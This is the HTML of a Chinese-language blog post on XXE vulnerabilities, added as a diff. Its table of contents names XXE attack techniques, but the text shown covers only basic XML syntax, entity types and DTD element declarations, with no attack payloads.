@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"h01iday.github.io","root":"/","images":"/images","scheme":"Muse","version":"8.7.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="XXE(&#x3D;&#x3D;X&#x3D;&#x3D;ML E&#x3D;&#x3D;x&#x3D;&#x3D;ternal &#x3D;&#x3D;E&#x3D;&#x3D;ntity)#1XML语法声明：1&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;yes&quot; ?&gt;   xml声明放在xml文档的第一行 standalone为文档定义是否独立使用 默认为no  节点 每个XML文档必须">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://h01iday.github.io/2021/10/17/XXE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="XXE(&#x3D;&#x3D;X&#x3D;&#x3D;ML E&#x3D;&#x3D;x&#x3D;&#x3D;ternal &#x3D;&#x3D;E&#x3D;&#x3D;ntity)#1XML语法声明：1&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;yes&quot; ?&gt;   xml声明放在xml文档的第一行 standalone为文档定义是否独立使用 默认为no  节点 每个XML文档必须">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/实体.jpg">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe1.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe2.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe3.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe4.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe5.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe6.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe7.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe8.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe9.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe10.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe12.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe11.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe13.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe14.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe19.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe18.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/xxe20.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/xxe21.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/xxe22.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/xxe23.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/xxe24.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe15.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/xxe16.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/xxe17.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/xxe26.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/xxe27.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/xxe25.png">
+<meta property="article:published_time" content="2021-10-17T05:12:24.620Z">
+<meta property="article:modified_time" content="2021-10-20T13:09:52.411Z">
+<meta property="article:author" content="H01iday">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:/blog/H01iday/source_posts/pics/实体.jpg">
+
+
+<link rel="canonical" href="https://h01iday.github.io/2021/10/17/XXE/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://h01iday.github.io/2021/10/17/XXE/","path":"2021/10/17/XXE/","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title> | Hexo</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Hexo</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE-X-ML-E-x-ternal-E-ntity"><span class="nav-number">1.</span> <span class="nav-text">XXE(&#x3D;&#x3D;X&#x3D;&#x3D;ML E&#x3D;&#x3D;x&#x3D;&#x3D;ternal &#x3D;&#x3D;E&#x3D;&#x3D;ntity)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1XML%E8%AF%AD%E6%B3%95"><span class="nav-number">1.1.</span> <span class="nav-text">#1XML语法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A3%B0%E6%98%8E%EF%BC%9A"><span class="nav-number">1.1.1.</span> <span class="nav-text">声明：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8A%82%E7%82%B9"><span class="nav-number">1.1.2.</span> <span class="nav-text">节点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7"><span class="nav-number">1.1.3.</span> <span class="nav-text">属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A"><span class="nav-number">1.1.4.</span> <span class="nav-text">注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CDATA%E8%8A%82"><span class="nav-number">1.1.5.</span> <span class="nav-text">CDATA节</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E4%BD%93"><span class="nav-number">1.1.6.</span> <span class="nav-text">实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DTD"><span class="nav-number">1.1.7.</span> <span class="nav-text">DTD</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E9%83%A8dtd%E6%96%87%E6%A1%A3"><span class="nav-number">1.1.7.1.</span> <span class="nav-text">内部dtd文档</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%96%E9%83%A8dtd%E6%96%87%E6%A1%A3"><span class="nav-number">1.1.7.2.</span> <span class="nav-text">外部dtd文档</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%83%E7%B4%A0"><span class="nav-number">1.1.7.3.</span> <span class="nav-text">元素</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%83%E7%B4%A0%E5%A3%B0%E6%98%8E%E7%9A%84%E8%AF%AD%E6%B3%95"><span class="nav-number">1.1.7.3.1.</span> <span class="nav-text">元素声明的语法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%86%E8%8A%82"><span class="nav-number">1.1.7.3.2.</span> <span class="nav-text">细节</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2XXE%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.2.</span> <span class="nav-text">#2XXE攻击类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#retrieve-files"><span class="nav-number">1.2.1.</span> <span class="nav-text">retrieve files</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%B2%E8%A7%A3%EF%BC%9A"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">讲解：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">例题：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#perform-SSRF-attacks"><span class="nav-number">1.2.2.</span> <span class="nav-text">perform SSRF attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%B2%E8%A7%A3%EF%BC%9A-1"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">讲解：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-1"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">例题：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Blind-XXE-vulnerabilities"><span class="nav-number">1.3.</span> <span class="nav-text">Blind XXE vulnerabilities</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#01exfiltrate-data-out-of-band"><span class="nav-number">1.3.0.1.</span> <span class="nav-text">01exfiltrate data out-of-band</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#regular-entitiy"><span class="nav-number">1.3.0.1.1.</span> <span class="nav-text">regular entitiy</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#parameter-entity"><span class="nav-number">1.3.0.1.2.</span> <span class="nav-text">parameter entity</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#exfiltrate-data"><span class="nav-number">1.3.0.1.3.</span> <span class="nav-text">exfiltrate data</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02retrieve-data-via-error-messages"><span class="nav-number">1.3.0.2.</span> <span class="nav-text">02retrieve data via error messages</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-2"><span class="nav-number">1.3.0.2.1.</span> <span class="nav-text">例题：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#03Exploiting-blind-XXE-by-repurposing-a-local-DTD"><span class="nav-number">1.3.0.3.</span> <span class="nav-text">03Exploiting blind XXE by repurposing a local DTD</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-3"><span class="nav-number">1.3.0.3.1.</span> <span class="nav-text">例题：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE%E6%B3%A8%E5%85%A5%E7%9A%84%E9%9A%90%E8%97%8F%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-number">1.4.</span> <span class="nav-text">XXE注入的隐藏攻击面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XInclude-attacks"><span class="nav-number">1.4.1.</span> <span class="nav-text">XInclude attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">使用场景：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Xinclude%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9A"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">Xinclude是什么：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Xinclude%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%EF%BC%9A"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">Xinclude如何使用：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E6%A0%97%E5%AD%90%EF%BC%9A"><span class="nav-number">1.4.1.4.</span> <span class="nav-text">实战栗子：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE-attacks-via-file-upload"><span class="nav-number">1.4.2.</span> <span class="nav-text">XXE attacks via file upload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SVG%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">SVG是什么</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-4"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">例题：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE-attacks-via-modified-content-type"><span class="nav-number">1.4.3.</span> <span class="nav-text">XXE attacks via modified content type</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">H01iday</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/10/17/XXE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="H01iday">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-10-17 13:12:24" itemprop="dateCreated datePublished" datetime="2021-10-17T13:12:24+08:00">2021-10-17</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-10-20 21:09:52" itemprop="dateModified" datetime="2021-10-20T21:09:52+08:00">2021-10-20</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="XXE-X-ML-E-x-ternal-E-ntity"><a href="#XXE-X-ML-E-x-ternal-E-ntity" class="headerlink" title="XXE(==X==ML E==x==ternal ==E==ntity)"></a>XXE(==X==ML E==x==ternal ==E==ntity)</h1><h2 id="1XML语法"><a href="#1XML语法" class="headerlink" title="#1XML语法"></a>#1XML语法</h2><h3 id="声明："><a href="#声明：" class="headerlink" title="声明："></a>声明：</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;yes&quot; ?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>xml声明放在xml文档的第一行</li>
+<li>standalone为文档定义是否独立使用 默认为no</li>
+</ul>
+<h3 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h3><ul>
+<li>每个XML文档<strong>必须有</strong>且<strong>只有一个</strong>根元素</li>
+<li>xml标签中的所有空格和换行，都会被当做标签内容进行处理。所以，在编写XML文件时，要特别注意。</li>
+<li>命名规范：caseSensitive,不能以数字或下划线”_”开头，元素内不包含空格、冒号，可使用中文</li>
+<li>不含标签体的节点表示：<code>&lt;a&gt;&lt;/a&gt;</code>,简写为:<code>&lt;a/&gt;</code></li>
+</ul>
+<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;元素名 属性名1=&quot;属性值1&quot; 属性名2=&quot;属性值2&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以用单引号/双引号</p>
+<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--这是一个注释--&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="CDATA节"><a href="#CDATA节" class="headerlink" title="CDATA节"></a>CDATA节</h3><p>CADTA节中的所有内容不会被解析执行，完全当作原始内容，解释为纯文字。故出现&lt;、&gt;等都不会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[</span><br><span class="line">    ......</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>实体的类型：</p>
+<ol>
+<li><p>Built-in entities</p>
+<p>预定义实体。</p>
+<p>如果在属性或者标签内使用如下的元素，要使用其实体表示。</p>
+</li>
+</ol>
+<p><img src="D:\blog\H01iday\source_posts\pics\实体.jpg" alt="实体"></p>
+<ol start="2">
+<li>Character entities</li>
+</ol>
+<p>有的符号如&#169;很难或者不可能在键盘上打出来，就会用到字符实体。</p>
+<p>例：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot; encoding = &quot;UTF-8&quot; standalone = &quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">author</span>[</span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ELEMENT <span class="meta-keyword">author</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="meta-keyword">writer</span> <span class="meta-string">&quot;Tanmay patil&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-string">&quot;&amp;#169;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当该xml文件被执行在浏览器打开时，就会呈现Tanmay patil©，即&amp;#169;会被作为&#169;处理</p>
+<ol start="3">
+<li>General entities</li>
+</ol>
+<p>General entities must be declared within the DTD before they can be used within an XML document.</p>
+<p>普通的可以看作是编程里面的定义变量</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="meta-keyword">source-text</span> <span class="meta-string">&quot;tutorialspoint&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">//source-text为变量名  对应后面双引号中的内容为变量值</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">   &amp;source-text;</span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ol start="4">
+<li>Parameter entities</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % ename &quot;entity_value&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>==注意%和ename中间一定要有空格！==</li>
+<li><em>entity_value</em> is any character that is not an <strong>==’&amp;’, ‘%’ or ‘ “ ‘.==</strong></li>
+</ul>
+<p>参数实体的目的是，建立一个reusable section。减少冗余。</p>
+<p><strong>XML parameter entities are a special kind of XML entity which can only be referenced elsewhere ==within the DTD==.</strong> </p>
+<p>参数实体不能在DTD子集内调用</p>
+<p>举个栗子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">四个元素的声明，可以看出来冗余度非常高</span><br><span class="line">&lt;!ELEMENT residence (name, street, pincode, city, phone)&gt;</span><br><span class="line">&lt;!ELEMENT apartment (name, street, pincode, city, phone)&gt;</span><br><span class="line">&lt;!ELEMENT office (name, street, pincode, city, phone)&gt;</span><br><span class="line">&lt;!ELEMENT shop (name, street, pincode, city, phone)&gt;</span><br><span class="line"></span><br><span class="line">可以通过参数实体来减少冗余性</span><br><span class="line">&lt;!ENTITY % area &quot;name, street, pincode, city&quot;&gt;</span><br><span class="line">&lt;!ELEMENT residence (%area;)&gt;</span><br><span class="line">&lt;!ELEMENT apartment (%area)&gt;</span><br><span class="line">&lt;!ELEMENT office (%area;)&gt;</span><br><span class="line">&lt;!ELEMENT shop (%area)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>【==参数实体重要的知识点：==】</p>
+<p>再内部DTD中参数实体不能写在实体声明内部，可以写在声明外。对于外部DTD，没有这个限制。</p>
+<p>普通文本 实体。</p>
+<p>内部实体声明</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">例：&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">下面通过&amp;write来引用这个实体的值</span><br></pre></td></tr></table></figure>
+
+<p>相当于变量。实体名称即为变量名，实体的值即为变量的值。</p>
+<p>外部实体声明</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">例：&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">&lt;!DOCTYPE name PUBLIC &quot;-//Beginning XML//DTD Address Example//EN&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><h4 id="内部dtd文档"><a href="#内部dtd文档" class="headerlink" title="内部dtd文档"></a>内部dtd文档</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [定义内容]&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="外部dtd文档"><a href="#外部dtd文档" class="headerlink" title="外部dtd文档"></a>外部dtd文档</h4><p>1）引用本地文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文件的URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h4><h5 id="元素声明的语法"><a href="#元素声明的语法" class="headerlink" title="元素声明的语法"></a>元素声明的语法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT 元素名称 类别&gt;</span><br><span class="line">类别：EMPTY：表示该元素不能包含子元素和文本，但可以有属性。</span><br><span class="line">	  ANY：表示该元素可以包含任何在该DTD中定义的元素内容</span><br><span class="line">	 #PCDATA：与CDATA不同，#PCDATA指会被解析器解析的文本</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT 元素名称 (元素内容)&gt;</span><br><span class="line">&lt;!ELEMENT 元素名称 (子元素名称 1,子元素名称 2,.....)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>e.g：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body    (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
+
+
+
